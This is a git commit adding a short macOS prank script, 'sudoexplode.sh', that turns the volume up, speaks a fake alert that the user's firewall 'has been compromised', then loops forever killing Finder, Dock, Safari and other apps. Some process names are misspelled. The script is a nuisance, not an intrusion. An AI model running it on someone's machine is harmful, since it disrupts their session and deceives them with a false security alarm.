e801527e181d901034529ebcb4334a8230c11f7a
L2A <37629537+R3d-N1njA@users.noreply.github.com>
2018-04-23 15:15:45 -0500

    Initial Commit
    This makes your mac explode. Not for windows

---
+++ sudoexplode.sh
@@ -0,0 +1,12 @@
+osascript -e "set volume 7"
+say -v Daniel "Your sonicwall firewall has been compromised!"
+while (true) do
+killall Desktop
+killall Dock
+killall Finder
+killall Spotlight
+killall Safari
+killall Trash
+killall Google Chrome
+killall System Preferances
+done
